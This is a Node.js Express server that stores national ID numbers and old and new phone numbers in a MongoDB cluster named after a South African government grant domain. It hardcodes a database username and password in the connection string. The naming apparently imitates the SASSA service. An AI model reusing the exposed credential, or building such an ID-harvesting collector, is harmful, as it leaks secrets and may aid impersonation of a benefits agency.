// server.js
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const Application = require('./models/Application');

const app = express();
app.use(cors());
app.use(express.json());

const MONGO_URI = process.env.MONGO_URI || 'mongodb+srv://mkasigiven09:Mkasi0152@srd-sassa-gov-za.qnutzho.mongodb.net/sassa';

mongoose.connect(MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log("✅ Connected to MongoDB"))
.catch(err => console.error("❌ MongoDB connection error:", err));

app.post('/submit', async (req, res) => {
  try {
    const { idNumber, phoneNumber, newphoneNumber } = req.body;

    // Check if the same ID was submitted within the last 24 hours
    const recentSubmission = await Application.findOne({
      idNumber,
      submittedAt: { $gt: new Date(Date.now() - 24 * 60 * 60 * 1000) }
    });

    if (recentSubmission) {
      return res.status(409).json({ message: "Request already submitted in the past 24h" });
    }

    const application = new Application({ idNumber, phoneNumber, newphoneNumber });
    await application.save();
    return res.status(201).json({ message: "Submitted successfully" });
  } catch (err) {
    console.error("Error submitting:", err);
    return res.status(500).json({ message: "Internal server error" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
